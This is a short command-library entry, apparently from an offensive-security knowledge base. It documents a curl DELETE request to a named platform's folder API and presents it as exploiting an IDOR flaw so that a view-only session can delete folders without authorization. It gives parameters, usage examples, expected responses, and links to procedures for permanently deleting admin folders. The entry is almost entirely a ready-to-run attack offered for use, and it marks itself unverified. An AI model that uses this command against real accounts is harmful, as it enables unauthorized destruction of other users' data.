---
data: >-
  curl -X DELETE -H "Authorization: Bearer $ACCESS_TOKEN" -H "Content-Type:
  application/json" https://app.lark.com/api/v1/folders/{folder_token}
tags:
  - api
  - delete
  - idor
  - web
type: command
output: null
executor: bash
platforms:
  - Web
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.082Z'
id: f39a6c61-2107-420f-918c-2609d67c62c6
verified: false
validated: true
submitted: true
---
# curl-delete-lark-folder

## Command

```bash
curl -X DELETE -H "Authorization: Bearer $ACCESS_TOKEN" -H "Content-Type: application/json" https://app.lark.com/api/v1/folders/{folder_token}
```

## Description

This command exploits an IDOR vulnerability by sending a DELETE request to a folder endpoint in Lark Technologies' platform using a direct alphanumeric token, allowing unauthorized deletion from a view-only session. Use it to test or perform folder removal without proper permission validation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X DELETE` | Specifies the HTTP DELETE method | Yes |
| `-H "Authorization: Bearer $ACCESS_TOKEN"` | Provides the authenticated session token (replace $ACCESS_TOKEN with actual value) | Yes |
| `-H "Content-Type: application/json"` | Sets the request body type (may be optional for DELETE) | Yes |
| `https://app.lark.com/api/v1/folders/{folder_token}` | Target endpoint with alphanumeric folder token (replace {folder_token}) | Yes |

## Examples

### Basic Usage

```bash
curl -X DELETE -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." https://app.lark.com/api/v1/folders/abc123def456
```

### Advanced Usage

Add verbose output for debugging:
```bash
curl -v -X DELETE -H "Authorization: Bearer $ACCESS_TOKEN" https://app.lark.com/api/v1/folders/{folder_token}
```

## Expected Output

Successful execution returns an HTTP 200 or 204 status with a JSON response like {"success": true, "message": "Folder deleted"}. Failure due to IDOR absence would be 403 Forbidden; 404 if token invalid.

## Related

- [[Related Procedure: Identify-IDOR-in-Folder-Access-with-View-Permissions]]
- [[Related Procedure: Exploit-IDOR-to-Permanently-Delete-Admin-Folder]]
